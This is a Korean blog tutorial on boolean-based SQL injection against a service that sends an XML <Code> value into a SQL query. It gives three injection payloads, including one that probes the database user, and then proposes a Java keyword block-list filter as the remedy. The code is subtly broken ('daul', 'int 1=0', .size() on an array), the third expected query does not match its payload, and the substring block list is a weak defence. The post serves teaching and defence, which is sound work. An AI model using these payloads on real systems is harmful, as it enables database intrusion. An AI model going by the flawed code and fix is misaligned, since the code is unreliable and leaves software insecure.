---
title:  "보안(1) SQL Injection 불리언 분기 공격"
excerpt: "보안(1) SQL Injection 불리언 분기 공격 입니다."

categories:
  - security
tags:
  - [보안, security, COMMON]

toc: true
toc_sticky: true

last_modified_at: 2025-08-22T10:16:00-10:16:00
---

## 개요
> ❗<span style='color:green'>***참 거짓을 이용한 반응으로 공격***</span>  
> 💡 *<span style='color:blue'>**해당 내용으로 DB정보까지 탈취 가능**</span> 


## 내용
### 전문
```xml
<!-- 기존 전송되는 기본 XML 전문 -->
<Code>2019</Code>

```

```sql
/* 예상 쿼리 */
SELECT * 
FROM some_table 
WHERE code = '2019';

```
  
Code 라는 태그를 통해 타서버에 값을 전달하며 통신하고 있다.  
{: .notice--info}  
    
   

### 공격코드 1
```js
// 참거짓 반응으로 인젝션 : 비정상 동작을 감지가능.
data = data.replace("<Code>2019", "<Code>2019'||(case when 1=1 then '1' else '' END)||'");

```

```sql
/* 예상쿼리 */
SELECT * 
FROM some_table 
WHERE code = '2019' || (case when 1=1 then '1' else '' END) || '';

```
   
  
### 공격코드 2
```js
// 참거짓 반응으로 인젝션 : 정상 동작을 감지가능. (일부러 틀리게 작성했으므로)
data = data.replace("<Code>2019", "<Code>2019'||(case when 1=2 then '1' else '' END)||'");

```

```sql
/* 예상쿼리 */
SELECT * 
FROM some_table 
WHERE code = '2019' || (case when 1=2 then '1' else '' END) || '';

```


### 공격코드 3
```js
// 참거짓 반응으로 인젝션 : 1,2 번을 통해 공격가능함을 인지하고 DB사용자조회로 공격 후 정보를 예상 
data = data.replace("<Code>2019", "<Code>2019'||(case when 'scott'=(select user from daul) then '1' else '' END)||'");

```

```sql
/* 예상쿼리 */
SELECT * 
FROM some_table 
WHERE code = '2019' || (case when 1=2 then '1' else '' END) || '';

```
  
  
  
## 조치

```java
//중략..
String[] filterSQL = {"DROP","TRUNCATE","DELETE","UPDATE","INSERT","AND","OR","||","&&","\""};

@RequestMapping(value = "/테스트", method = Request.POST, produces = "text/plain;charset=UTF-8")
public @ResponseBody String 테스트(HttpServletRequest request, HttpServletResponse response) throws Exception

if(특정전문케이스 == true) 
{
    String responseXML = data;

    String regex = "<Code\\s*(.*?)\\s*</Code>"; // <Code></Code> 내부를 정규식.
    Pattern pattern = Pattern.compile(regex);

    Matcher matcher = pattern.matcher(responseXML);
    while(matcher.find()) 
    {
      String findValue = matcher.group(1).toUpperCase();

      for(int 1=0; i < filterSQL.size(); i++) 
      {
        if(findValue.contains(filterSQL[i])) {
          throw new BusinessLogicSQLException();
        }
      }
      
    }
}

//이하 정상로직

```


## 정리
> ❗<span style='color:green'>***SQL Injection의 고전적인 형태***</span>   
> 💡 *<span style='color:blue'>**이 공격은 || (CASE WHEN 1=1 THEN '1' ELSE '' END) || 를 붙여서 쿼리 문자열을 조작함.**</span>   
> 💡 *<span style='color:blue'>**결과적으로 WHERE 절 조건을 의도적으로 true/false로 바꿀 수 있다.**</span>   
> 💡 *<span style='color:blue'>**이 방식은 SQL Injection의 고전적인 형태로,  DB 종류(Oracle, PostgreSQL 등 || 문자열 연산 지원 DB)에서 특히 위험.**</span>   





